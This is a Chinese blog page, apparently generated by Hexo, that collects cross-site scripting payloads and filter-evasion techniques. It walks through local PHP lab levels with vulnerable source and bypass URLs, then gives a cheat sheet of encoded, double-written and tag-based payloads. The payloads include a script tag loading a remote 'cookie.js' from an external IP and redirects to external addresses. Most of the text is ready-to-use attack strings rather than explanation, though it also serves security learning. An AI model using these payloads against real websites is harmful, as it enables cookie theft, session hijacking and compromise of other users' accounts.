@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>XSS姿势小集 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。 XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变">
+<meta name="keywords" content="web漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS姿势小集">
+<meta property="og:url" content="http://yoursite.com/2019/03/04/XSS姿势小集/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。 XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://47.106.185.69/1/./img/1554876174.jpg">
+<meta property="og:updated_time" content="2019-04-11T02:58:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS姿势小集">
+<meta name="twitter:description" content="前言由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。 XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变">
+<meta name="twitter:image" content="http://47.106.185.69/1/./img/1554876174.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XSS姿势小集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/04/XSS姿势小集/" class="article-date">
+  <time datetime="2019-03-03T16:00:00.000Z" itemprop="datePublished">2019-03-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XSS姿势小集
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于XSS攻击原理很简单，用百度一段话，本文重点在记录一些绕过姿势。</p>
+<p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p>
+<p>个人理解：XSS较为简单，理解起来也比较简单，一部分代码可控，并且显示在网页中，并且能够解析，就能够造成XSS漏洞，一般解析javascript来造成攻击。</p>
+<h1 id="转先知社区上几个payload（无过滤）"><a href="#转先知社区上几个payload（无过滤）" class="headerlink" title="转先知社区上几个payload（无过滤）"></a>转先知社区上几个payload（无过滤）</h1><p>参考：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
+<pre><code>&lt;scirpt&gt;
+&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;
+
+&lt;img&gt;
+&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;
+
+&lt;input&gt;
+&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+竞争焦点，从而触发onblur事件
+&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;
+
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;
+
+&lt;details&gt;
+&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+使用open属性触发ontoggle事件，无需用户去触发
+&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;
+
+&lt;svg&gt;
+&lt;svg onload=alert(&quot;xss&quot;);&gt;
+
+&lt;select&gt;
+&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
+
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+&lt;select onfocus=alert(1) autofocus&gt;
+
+&lt;iframe&gt;
+&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
+
+&lt;video&gt;
+&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;
+
+&lt;audio&gt;
+&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;
+
+&lt;body&gt;
+&lt;body/onload=alert(&quot;xss&quot;);&gt;
+
+利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
+
+&lt;body
+onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+
+&lt;textarea&gt;
+&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;
+
+&lt;keygen&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐
+
+&lt;marquee&gt;
+&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; </code></pre><p>补充</p>
+<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></pre><h1 id="XSS环境"><a href="#XSS环境" class="headerlink" title="XSS环境"></a>XSS环境</h1><p>phpstudy  </p>
+<p>Apache+PHP 5.4</p>
+<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_POST[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&quot;.$ss.&quot;&gt;&quot;;
+?&gt;</code></pre><p>需要闭合前面的尖括号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;;
+?&gt;</code></pre><p>这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;input type=text value=&apos;&quot;.$ss.&quot;&apos;&gt;&quot;;
+?&gt;</code></pre><p>这一关增加单引号，闭合前面的尖括号，并且闭合单引号，才能解析。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&apos;&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关需要闭合textarea标签。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+echo &quot;&lt;xmp&gt;$ss&lt;/xmp&gt;&quot;;
+?&gt;</code></pre><p>这一关需要闭合xmp标签，xmp标签会将标签内的任何代码不做任何处理的显示出来。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/xmp&gt;&lt;script&gt;alert(&apos;a&apos;)&lt;/script&gt;</code></pre><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/&gt;/&quot;,&quot;&amp;gt&quot;,$ss);
+$ss=preg_replace(&quot;/&lt;/&quot;,&quot;&amp;lt&quot;,$ss);
+echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$ss.&apos;&quot;&gt;&apos;;
+?&gt;</code></pre><p>这一关将尖括号进行了实体化，本打算使用js来进行实体编码，但是写了半天没写出来！php将就用吧。 </p>
+<p>通常情况下实体化基本可以防御所有xss，但是在特定情况下并不需要尖括号，通过autofocus属性去触发onfocus事件</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&quot; autofocus onfocus=&quot;alert(&apos;a&apos;)</code></pre><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+echo &apos;&lt;iframe src=&quot;&apos;.$ss.&apos;&quot;&gt;&lt;/iframe&gt;&apos;;
+?&gt;</code></pre><p>这一关过滤了双引号，但是在双引号内可以利用javascript伪协议来加载script脚本。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=javascript:alert(1)</code></pre><h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><p>源码：</p>
+<pre><code>&lt;?php
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+$ss=preg_replace(&apos;/onerror/&apos;,&quot;&quot;,$ss);
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关过滤了很多标签，双引号也被过滤了，假装该过滤的都过滤了，唯独svg没过滤。那就相当于什么都没过滤了。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;svg onload=eval(atob(&apos;YWxlcnQoMSk=&apos;))&gt;</code></pre><p>注释：onload 事件会在页面或图像加载完成后立即发生，eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码，atob解码base64。</p>
+<p>闭合前面标签，再用svg标签，atob中的base64编码绕过一切过滤，只要svg没过滤。</p>
+<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><p>源码：</p>
+<pre><code>header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&apos;/windows/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/document/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/img/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/script/&apos;,&quot;&quot;,$ss);
+$ss=preg_replace(&apos;/&quot;/&apos;,&quot;&amp;quot&quot;,$ss);
+
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+
+?&gt;</code></pre><p>这一关预加载绕过xss，参考文章第下面链接的第十二关，这关加了个csp内容安全策略。  </p>
+<p>CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</p>
+<p>CSP 以白名单的机制对网站加载或执行的资源起作用。在网页中，这样的策略通过 HTTP 头信息或者 meta 元素定义。CSP虽然提供了强大的安全保护，但是他也造成了如下问题：Eval及相关函数被禁用、内嵌的JavaScript代码将不会执行、只能通过白名单来加载远程脚本。</p>
+<h1 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/&apos;/&quot;,&quot;\&apos;&quot;,$ss);
+    echo &quot;&lt;script&gt;console.log(&apos;&quot;.$ss.&quot;&apos;)&lt;/script&gt;&quot;;        
+?&gt;</code></pre><p>这道题斜线被转义了，后面的括号和单引号用注释符（script中//注释）注释掉，前面单引号再加一个反斜线转义，</p>
+<pre><code>http://127.0.0.1/xss.php?xss=1\&apos;);alert(1);//</code></pre><h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p>源码：</p>
+<pre><code>&lt;?php
+#&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; img-src https://*; child-src &apos;none&apos;;&quot;&gt;
+header(&quot;Content-Security-Policy:
+        script-src &apos;self&apos; &apos;unsafe-inline&apos;;
+        frame-src &apos;self&apos;;&quot;);
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;&lt;textarea&gt;$ss&lt;/textarea&gt;&quot;;
+?&gt;</code></pre><p>这一关闭合标签，script过滤为空，双写绕过。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;/textarea&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></pre><h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+
+header(&quot;X-XSS-Protection: 1; mode=block&quot;); 
+$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>过滤了script可以大小写绕过，但是多了一个header头X-XSS-Protection，这个头有三个值。分别为</p>
+<pre><code>0： 表示关闭浏览器的XSS防护机制
+
+1：删除检测到的恶意代码， 如果响应报文中没有看到X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置
+
+1; mode=block：如果检测到恶意代码，在不渲染恶意代码</code></pre><p>script会被拦截，使用双写可以绕过，可能根据不同浏览器，火狐中这个请求头没作用，原文说要换大小写，无可厚非，这里不换大小写也可以。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;ScrscriptiPt&gt;alert(&apos;a&apos;)&lt;/ScrscriptiPt&gt;</code></pre><h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p>源码：</p>
+<pre><code>&lt;!DOCTYPE html&gt; 
+&lt;html lang=&quot;zh-CN&quot;&gt;
+&lt;body&gt;
+&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;
+&lt;div&gt;
+&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+if(strlen($ss)&gt;10)
+{
+    $ss=substr(&quot;$ss&quot;,0,40);
+}
+#$ss=preg_replace(&quot;/script/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>这一关长度被限制，可以尽力使用短的链接,网站可以根据IP转换十进制。 2544985753=127.0.0.1</p>
+<p>http也不用输入，双斜线即可跳转新窗口。空格等被过滤用/替换。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;svg/onload=window.open(&apos;//2544985753&apos;)&gt;</code></pre><p>或者</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;svg/onload=eval(location.hash.slice(1))&gt;#alert(1)
+//注：#后面不算入长度</code></pre><p>参考原文的第25关短出新高度。</p>
+<h1 id="0x13"><a href="#0x13" class="headerlink" title="0x13"></a>0x13</h1><p>源码：</p>
+<pre><code>&lt;?php
+
+ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
+$ss=$_GET[&apos;xss&apos;];
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;&lt;br/&gt;&quot;;
+echo &quot;                         &quot;;
+
+$ss=preg_replace(&quot;/\./&quot;,&quot;&quot;,$ss);
+$ss=preg_replace(&quot;/\&apos;/&quot;,&quot;&quot;,$ss);
+$ss=preg_replace(&quot;/\&quot;/&quot;,&quot;&quot;,$ss);
+    echo &quot;$ss&quot;;
+?&gt;</code></pre><p>过滤了单引号双引号和.。</p>
+<p>按原文可以使用数组形式，.可以采用十进制来表示。引号使用反引号代替。</p>
+<pre><code>http://127.0.0.1/xss.php?xss=&lt;script&gt;window[&apos;open&apos;](&apos;http://2544985753&apos;)&lt;/script&gt;</code></pre><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><pre><code>1.使用/替代空格  如：&lt;img/src=&apos;1&apos;/onerror=alert(&quot;xss&quot;);&gt;
+2.大小写绕过，函数不能大小写
+3.如果是正则替换匹配将script img 等置换为空，可采取双写绕过，如：scrscriptipt
+4.eval字符拼接。 &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;
+5.top拼接字符    &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;
+6.
+
+如果script没被禁止，可以写,只有script 标签里的src可以解析js其他的标签不可以。
+
+&lt;script src=&quot;http://xx.xx.xx.xx/xss/myjs/cookie.js&quot;&gt;&lt;/script&gt;
+
+实体化字符绕过，在浏览器中需要url编码 实体化字符，浏览器会自动截断#后面字符。
+
+&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;
+
+Unicode编码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003b&apos;)&quot;&gt;
+
+url编码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;  #unescape对括号内进行解码
+
+data协议 //xss常用
+
+&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;  #不url编码也可。
+
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; #好用真好用。
+
+Ascii码绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;
+
+hex绕过
+
+&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;
+
+八进制
+
+&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;
+
+base64绕过
+
+&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;
+
+javascript: 协议 XSS
+
+&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt; //需要点击
+&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt; //直接执行js
+
+7.在js中利用反引号替代单引号双引号。如： &lt;img src=1 onerror=alert(`aa`)&gt;
+
+8.过滤括号 &lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;
+
+9.html标签中用//可以代替http://
+
+
+10.十进制ip &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</code></pre><h1 id="黑魔法"><a href="#黑魔法" class="headerlink" title="黑魔法"></a>黑魔法</h1><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg xss"></a>svg xss</h2><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 可以执行xss攻击，但是&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;却不可以，为什么加&lt;svg&gt;可以执行，</code></pre><p>svg属于外部元素，外部元素来源于MathML和SVG命名空间。而mathml的定义如下。 </p>
+<p><img src="http://47.106.185.69/1/./img/1554876174.jpg" alt></p>
+<p>那么相应的<svg>标签也遵循xml 和svgd的定义，在xml中 &amp;#40;会被解析成（，所以可以执行。</svg></p>
+<p>可以看考下原文，</p>
+<pre><code>https://www.hackersb.cn/hacker/85.html  </code></pre><h2 id="邮件格式XSS"><a href="#邮件格式XSS" class="headerlink" title="邮件格式XSS"></a>邮件格式XSS</h2><p>通常情况下邮件格式也会造成XSS，必须按照有效的电子地址才能填写成功，</p>
+<pre><code>&quot;&lt;svg/onload=alert(1)&gt;&quot;@x.y</code></pre><p>既符合格式也可以造成XSS，</p>
+<h2 id="url的-0A绕过"><a href="#url的-0A绕过" class="headerlink" title="url的%0A绕过"></a>url的%0A绕过</h2><p>在实际情况中，在需要我们输入url的输入框中，对规则进行了检查，如果我们写javascript://是没法执行的，因为在JavaScript伪协议中，我们在双斜线后面使用JS代码，会payload无效，</p>
+<p>也就是 </p>
+<pre><code>&lt;iframe src=&quot;javascript://alert(1)&quot;&gt;</code></pre><p>这个时候可以用换行符绕过。</p>
+<pre><code>&lt;iframe src=&quot;javascript://%250Aalert(1)&quot;&gt;
+
